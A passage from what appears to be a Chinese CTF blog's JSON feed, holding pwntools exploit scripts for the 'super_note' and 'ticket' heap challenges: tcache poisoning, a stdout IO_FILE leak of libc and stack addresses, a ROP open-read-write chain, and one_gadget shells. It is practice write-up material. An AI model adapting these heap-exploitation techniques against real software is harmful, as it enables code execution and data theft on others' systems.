class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">to_pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n\n  show<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n  p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"address:[\"</span><span class=\"token punctuation\">)</span>\n  low_addr <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token string\">'0x1080'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x18b0</span>\n\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"low_addr\"</span><span class=\"token punctuation\">,</span>low_addr<span class=\"token punctuation\">)</span>\n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p16<span class=\"token punctuation\">(</span>low_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#0x8910</span>\n  <span class=\"token comment\">#0x7000</span>\n  <span class=\"token comment\">#0x18b0</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">9</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0007000700070007</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span> \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span> \n  add<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span> \n\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\xb0\"</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#链到4</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>p16<span class=\"token punctuation\">(</span><span class=\"token number\">0xd6a0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0001000100010001</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x00\"</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n  p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n  leak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">if</span> leak <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> EOFError\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak\"</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#stdout 0xd6a0</span>\n  offset <span class=\"token operator\">=</span> <span class=\"token number\">0x7f563057d6a0</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7f563057c980</span>\n  _IO_2_1_stdout_ <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> offset\n  libc_base <span class=\"token operator\">=</span> _IO_2_1_stdout_ <span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"_IO_2_1_stdout_\"</span><span class=\"token punctuation\">]</span>\n  environ <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"environ\"</span><span class=\"token punctuation\">,</span>environ<span class=\"token punctuation\">)</span>\n\n  payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>environ<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>environ<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n  stack_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x120</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"stack_addr\"</span><span class=\"token punctuation\">,</span>stack_addr<span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>\n  delete<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>\n  add<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>\n\n  read_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\n  open_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"open\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\n  puts_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libc_base\n  \n  ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000025679</span> <span class=\"token operator\">+</span> libc_base\n  syscall <span class=\"token operator\">=</span> <span class=\"token number\">0X00000000011B70B</span> <span class=\"token operator\">+</span> libc_base <span class=\"token comment\">#手找的</span>\n  pop_rax_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000004a550</span> <span class=\"token operator\">+</span> libc_base\n  pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000026b72</span> <span class=\"token operator\">+</span> libc_base\n  pop_rsi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000027529</span> <span class=\"token operator\">+</span> libc_base\n  pop_rdx_rbx_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000001626d6</span> <span class=\"token operator\">+</span> libc_base\n  \n \n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"pop_rdi_ret\"</span><span class=\"token punctuation\">,</span>pop_rdi_ret<span class=\"token punctuation\">)</span>\n  lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"read_addr\"</span><span class=\"token punctuation\">,</span>read_addr<span class=\"token punctuation\">)</span>\n\n  <span class=\"token comment\">#gdb.attach(p,\"b *puts\")</span>\n  <span class=\"token comment\">#pause()</span>\n  payload <span class=\"token operator\">=</span>  p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_rbx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span>\n  \n  edit<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span>\n  \n  payload_orw <span class=\"token operator\">=</span> <span class=\"token string\">\"flag\\x00\"</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span>\n  \n  payload_orw<span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rax_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n  \n  payload_orw<span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_rbx_ret<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span>\n  \n  payload_orw<span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span>\n  \n  <span class=\"token comment\">#dbg()</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"done\"</span><span class=\"token punctuation\">,</span>payload_orw<span class=\"token punctuation\">)</span>\n  \n  \n  p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  \n\n<span class=\"token comment\">#to_pwn()</span>\n\ni <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n    log<span class=\"token punctuation\">.</span>warn<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        to_pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span> Exception<span class=\"token punctuation\">:</span>\n        p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">continue</span>\n\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   super_note.py\n@Time    :   2021/06/03 19:52:39\n@Author  :   Niyah \n'''</span>\n</code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串",
                "堆",
                "BUUCTF",
                "IO_FILE"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/DASCTFxBuuctf%E4%BA%94%E6%9C%88%E5%A4%A7%E8%81%94%E5%8A%A8/",
            "url": "http://niyah.cn/CTF/DASCTFxBuuctf%E4%BA%94%E6%9C%88%E5%A4%A7%E8%81%94%E5%8A%A8/",
            "title": "DASCTFxBuuctf五月大联动",
            "date_published": "2021-06-03T14:10:27.000Z",
            "content_html": "<p>还得加油</p>\n<a id=\"more\"></a>\n<h1 id=\"ticket\"><a class=\"markdownIt-Anchor\" href=\"#ticket\">#</a> ticket</h1>\n<p>libc-2.23 下的题目，漏洞点在于只要某个位置 + 6 的地方有值，就可以 free 该位置，之后将那个位置 + 6 位置清 0</p>\n<ol>\n<li>将输入信息的堆块申请两次，之后 free 掉 name 和（-2 和 - 1）再显示信息就可以泄露堆地址</li>\n<li>利用 unsortedbin 切割后输出泄露出 libc 地址</li>\n<li>既然我们有堆地址，那么我们可以在 age 出伪造一个指针，这个指针指向一个堆块，那么加上之前申请的一个指针就有两个指针指向了同一个堆块，强行 uaf</li>\n<li>利用 relloc 调节栈帧再使用 onegadget getshell</li>\n</ol>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- coding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys\n<span class=\"token keyword\">import</span> os\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span>\n\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'ticket'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc-2.23.so\"</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\n\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n  p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",binary])</span>\n  <span class=\"token comment\">#p = process([\"qemu-aarch64\",\"-L\",\"\",-g,\"1234\",binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n  host <span class=\"token operator\">=</span> <span class=\"token string\">\"node3.buuoj.cn\"</span>\n  port <span class=\"token operator\">=</span>  <span class=\"token number\">29266</span>\n  p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x7f\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\xf7\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b  <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b  <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\": 0x%x\"</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>      <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload<span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a     <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n  pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">>\"</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"size:\"</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"remarks:\"</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show_info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  cmd<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n  sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your name:\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n  sa<span class=\"token punctuation\">(</span><span class=\"token string\">\"take off(wu hu qi fei): \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n  sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your age: \"</span><span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x45216</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x4526a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf02a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1147</span><span class=\"token punctuation\">]</span>\n\ninfo<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\ninfo<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 保证name+6地方有值</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> \n\ndelete<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\nshow_info<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Saying: \"</span><span class=\"token punctuation\">)</span>\n\nheap_addr <span class=\"token operator\">=</span>  u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x0a\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"leak\"</span><span class=\"token punctuation\">,</span>heap_addr<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x118</span><span 